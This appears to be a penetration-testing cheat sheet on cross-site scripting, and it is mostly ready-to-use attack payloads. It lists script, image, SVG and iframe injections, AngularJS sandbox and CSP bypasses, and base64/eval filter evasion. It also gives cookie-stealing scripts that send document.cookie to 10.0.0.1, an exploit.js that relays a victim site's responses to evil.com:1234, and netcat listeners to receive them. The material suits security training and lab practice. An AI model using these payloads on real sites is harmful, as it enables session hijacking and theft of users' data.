---
title: XSS (Cross-Site Scripting)
description: XSS enables attackers to injection client-side scripts into web applications.
tags:
    - XSS
    - Web
refs:
    - https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked
    - https://portswigger.net/research/xss-without-parentheses-and-semi-colons
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md
    - https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
date: 2023-07-06
draft: false
---

<div data-pagefind-ignore>

## Payloads

We can insert them into **URL params**,  **POST params** or **HTTP headers**.

### Script Tags

```txt
<script>alert(1)</script>
"><script>alert(1)</script>
<script>alert(1)</script>
"><script>alert(1)</script>
'></script><script>alert(1)</script>
<script>onerror=alert;throw 123</script>
<script>{onerror=alert}throw 123</script>
<script>throw onerror=alert,'hello',123,'world'</script>
<script>fetch('/profile?new_password=password');</script>
</textarea><script>alert(1)</script>

%3Cscript%3Ealert%281%29%3C%2Fscript%3E

';alert(1);'
```

### Img Tags

```txt
" src=1 onerror=alert(1)>
<><img src=1 onerror=alert(1)>
"><img src=1 onerror=alert(1)>
"></span><img src=1 onerror=alert(1)>

<img src="javascript:alert(1)">
<img src="jav ascript:alert(1)">
<img src="jav&#x09;ascript:alert(1)">
<img src="jav&#x0A;ascript:alert(1)">

<img dynsrc="javascript:alert(1)">
<img lowsrc="javascript:alert(1)">
```

### SVG Tags

```txt
"><svg onload=alert(1)>
<svg onmouseover="alert(1)"></svg>
<svg><animatetransform onclick="alert(1)"></svg>
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

### Anchor Tags

```txt
<a onmouseover=alert(1)>click</a>
<a href="javascript:alert(1)">Click</a>
```

### Iframe Tags

```txt
<iframe src="javascript:alert(1)"></iframe>
<iframe src=http://10.0.0.1:8000/xss.js></iframe>
<iframe onload=alert(1)></iframe>
```

### Body Tags

```bash
<body background="javascript:alert(1)">
```

### HTML Entity

Reference: [https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-onerror-and-javascript-alert-encode](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-onerror-and-javascript-alert-encode)

```html
<!-- <img src=javascript:alert('XSS')> -->
<img src=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>

<!-- onerror="javascript:alert('XSS')" -->
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```

### Others

```txt
" onmouseleave='alert(1)'">

javascript:alert(1)
\"-alert(1)//

/?q=&subparam=--><script>alert(1)</script>
/index.php#value='><script>alert(1)</script>
```

To find tags, events and payloads for XSS, we can see [Port Swigger's XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

<br />

## Payloads - JQuery

```txt
https://example.com/#<img src=1 onerror=alert(1)>
<iframe src="https://example.com/#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

<br />

## Payloads - AngularJS

If you find **`<html ng-app>`**, **`<body ng-app>`** or **`<div ng-app>`** in the HTML source code, you may be able to abuse it by XSS.

```txt
https://example.com/?search={{$eval.constructor('alert(1)')()}}
https://example.com/?search={{$on.constructor('alert(1)')()}}
```

To perform XSS without **`$eval`** function and quotes, we might be able to take another approach.  
[This PortSwigger's lab](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings) provides the following payload. But sorry, I don’t understand how it works at the moment.

```bash
# toString() : Create a string without quotes.
# toString().constructor.prototype.charAt=[].join :  Override `charAt` function for all strings with `[].join`.
# [1]|orderBy:toString().constructor.fromCharCode(...) : Pass an array to the `orderBy` filter.
# 120,61,97,108,101,114,116,40,49,41 : It means `x=alert(1)` in decimal.
https://example.com/?q=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

### AngularJS and CSP (Content Security Policy)

Reference: [PortSwigger's lab](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp)

If the website uses AngularJS with CSP (**`ng-csp`**) as below,

```html
<body ng-app ng-csp>
```

We need to bypass them by using a focus event (**`ng-focus`**), 

```html
/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
```

<br />

## Cookie Stealing

Create the following payload for stealing Cookie and inject into target web page.

```html
<!-- GET request -->
<script>fetch("http://10.0.0.1/?"+btoa(document.cookie));</script>

<!-- POST request -->
<script>
    fetch("http://10.0.0.1/", {
        method: 'POST',
        mode: 'no-cors',
        body: document.cookie
    });
</script>
```

Start web server or listener in local machine.

```bash
sudo python3 -m http.server 80
# or
sudo nc -lvp 80
```

<br />

## Filter Evasion

### Base64 & Eval

Website may sanitize inputs to prevent from malicious code. However, we might be able to circumvent by modifying our code.  
For example, change JavaScript code to Base64 string.

```bash
fetch("http://evil.com/"+document.cookie);
# Base64: ZmV0Y2goImh0dHA6Ly9ldmlsLmNvbS8iICsgZG9jdW1lbnQuY29va2llKTs=
```

Insert the base64 string into the **“eval”** function as below.


```bash
# '(' => '\x28'
# ')' => '\x29'
<img src="x" onerror=eval.call`${"eval\x28atob`ZmV...2EoZCkpKQo=`\x29"}`
```

<br />

## Interact with Another Host via XML HTTP Request

We might be able to send request the another host and retrieve the response.  
First, create a JavaScript file named **`exploit.js`** here. Replace **`http://evil.com`** with your local ip address.  
By this script, we send a request to **`http://sub.victim.com`** then fetch the response from the host.

- **GET Request**

```jsx
// exploit.js
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = () => {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        var xhr_exfil = new XMLHttpRequest();
        xhr_exfil.open('POST', "http://evil.com:1234/", false);
        xhr_exfil.send(xhr.response);
    }
};
xhr.open('GET', "http://victim.com/index.php", false);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send();
```

- **POST Request**

```jsx
// exploit.js
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = () => {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        var xhr_exfil = new XMLHttpRequest();
        xhr_exfil.open('POST', "http://evil.com:1234/", false);
        xhr_exfil.send(xhr.response);
    }
};
xhr.open('POST', "http://victim.com/login.php", false);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send("username=admin&password=admin");
```

Now we start web server to host the `exploit.js` and listener to receive the response.

```bash
# Terminal 1: Web server
sudo python3 -m http.server 80

# Terminal 2: Listener
sudo nc -lvp 1234
```

Then send a request with XSS to execute our payload (**`exploit.js`**). 
Replace the **`evil.com`** with your local ip address.

```bash
<script src="http://evil.com/exploit.js"></script>
```

We might fetch the response.

<br />

## Automation

**[XSStrike](https://github.com/s0md3v/XSStrike)** is a XSS scanner.

```sh
# GET request
python xsstrike.py -u http://vulnerable.com/?param=test

# POST reqeust
python xsstrike.py -u http://vulnerable.com/post --data "username=test&email=test&comment=test"

# data as JSON
python xsstrike.py -u http://vulnerable.com/comment --data '{"comment": "test"}' --json
```

</div>